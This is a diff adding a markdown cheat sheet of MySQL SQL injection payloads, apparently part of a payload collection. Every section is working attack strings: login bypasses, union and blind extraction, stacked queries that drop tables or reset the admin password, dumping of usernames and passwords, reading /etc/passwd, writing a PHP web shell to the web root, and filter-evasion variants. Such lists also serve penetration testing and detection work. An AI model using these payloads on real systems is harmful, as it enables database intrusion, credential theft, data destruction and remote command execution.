@@ -1,0 +1,65 @@
+# MySQL SQL Injection Payloads
+
+## Authentication Bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+## Union-Based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+
+## Error-Based
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND EXTRACTVALUE(1,CONCAT(0x5c,version()))--
+
+## Boolean-Based Blind
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(version(),1,1)='5'--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
+
+## Time-Based Blind
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' AND IF(1=1,SLEEP(5),0)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+## Stacked Queries
+'; DROP TABLE users;--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+
+## Database Enumeration
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database()--
+
+## Data Exfiltration
+' UNION SELECT username,password FROM users--
+' UNION SELECT CONCAT(username,':',password) FROM users--
+' UNION SELECT GROUP_CONCAT(username,':',password) FROM users--
+
+## File Operations (if permissions allow)
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'--
+
+## WAF Bypass
+' /**/OR/**/1=1--
+' /*!50000OR*/1=1--
+' %0aOR%0a1=1--
+'+OR+1=1--
+'||'1'='1
